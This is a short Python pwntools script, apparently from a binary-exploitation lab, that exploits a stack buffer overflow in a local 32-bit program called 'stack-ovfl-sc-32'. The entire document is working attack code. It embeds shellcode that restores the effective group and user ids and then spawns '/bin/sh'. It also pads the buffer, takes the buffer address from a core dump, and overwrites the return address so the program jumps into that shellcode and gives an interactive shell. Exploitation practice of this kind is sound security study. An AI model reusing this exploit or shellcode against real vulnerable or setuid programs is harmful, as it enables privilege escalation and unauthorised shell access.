#!/usr/bin/env python

from pwn import *

file_name = './stack-ovfl-sc-32'

context.terminal = ['tmux', 'splitw', '-h']

shellcode = 'j2X\xcd\x80\x89\xc3\x89\xc1jGX\xcd\x801\xc91\xd2j\x0bX1\xf6Vhn/shh//bi\x89\xe3\xcd\x80'

buf = shellcode
buf += "A" * (0x88 + 4 - len(shellcode))

p = process(file_name)
p.sendline(buf)
p.wait()

c = Core('core')
buffer_addr = c.stack.find(buf)
# buffer_addr = 0xffffc470

print(hex(buffer_addr))

buf = shellcode
buf += "A" * (0x88 + 4 - len(shellcode))
buf += p32(buffer_addr)

p = process(file_name)
# gdb.attach(p)
p.sendline(buf)
p.interactive()

